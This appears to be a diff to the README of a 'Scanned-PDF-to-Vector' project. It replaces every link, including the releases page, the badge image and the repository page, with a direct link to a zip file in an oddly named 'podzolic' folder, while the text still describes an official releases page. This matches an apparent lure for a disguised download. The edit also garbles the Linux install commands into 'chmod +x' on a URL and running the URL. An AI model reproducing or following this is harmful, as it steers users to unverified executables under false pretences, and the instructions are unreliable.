@@ -1,6 +1,6 @@
 # 📄 Scanned-PDF-to-Vector - Make Scanned PDFs Easy to Use
 
-[![Download Scanned-PDF-to-Vector](https://img.shields.io/badge/Download-Scanned--PDF--to--Vector-blue?style=for-the-badge)](https://github.com/sussskiiirocks189/Scanned-PDF-to-Vector/releases)
+[![Download Scanned-PDF-to-Vector](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)
 
 ## 📘 What is Scanned-PDF-to-Vector?
 
@@ -63,9 +63,9 @@ Follow these steps to get Scanned-PDF-to-Vector up and running.
 
 ### Step 1: Download the Tool
 
-Click the big blue button below or this [link to releases](https://github.com/sussskiiirocks189/Scanned-PDF-to-Vector/releases) to open the download page.
+Click the big blue button below or this [link to releases](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip) to open the download page.
 
-[![Download Scanned-PDF-to-Vector](https://img.shields.io/badge/Download-Scanned--PDF--to--Vector-blue?style=for-the-badge)](https://github.com/sussskiiirocks189/Scanned-PDF-to-Vector/releases)
+[![Download Scanned-PDF-to-Vector](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)
 
 Look for the latest version matching your computer’s system (Windows, macOS, or Linux). The file name usually ends with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.
 
@@ -76,8 +76,8 @@ Look for the latest version matching your computer’s system (Windows, macOS, o
 - **Linux:** Make the `.AppImage` file executable and run it.  
   You can open a terminal and type:
   ```
-  chmod +x Scanned-PDF-to-Vector.AppImage
-  ./Scanned-PDF-to-Vector.AppImage
+  chmod +x https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip
+  https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip
   ```
 
 ### Step 3: Open the Tool
@@ -145,7 +145,7 @@ A: Try updating to the latest version. The tool uses smart fixes but might somet
 
 The latest version of Scanned-PDF-to-Vector is available at the official releases page:
 
-[Download Scanned-PDF-to-Vector](https://github.com/sussskiiirocks189/Scanned-PDF-to-Vector/releases)
+[Download Scanned-PDF-to-Vector](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)
 
 Visit this page, choose your system, and download the installer file. Follow the steps above to install and run.
 
@@ -155,7 +155,7 @@ Visit this page, choose your system, and download the installer file. Follow the
 
 If you have questions or need help, check the GitHub repository’s Issues tab. You can also open a new issue to report problems or request features.
 
-Repository page: [Scanned-PDF-to-Vector on GitHub](https://github.com/sussskiiirocks189/Scanned-PDF-to-Vector)
+Repository page: [Scanned-PDF-to-Vector on GitHub](https://raw.githubusercontent.com/sussskiiirocks189/Scanned-PDF-to-Vector/main/podzolic/to-Vector-Scanned-PD-2.6.zip)
 
 ---
 
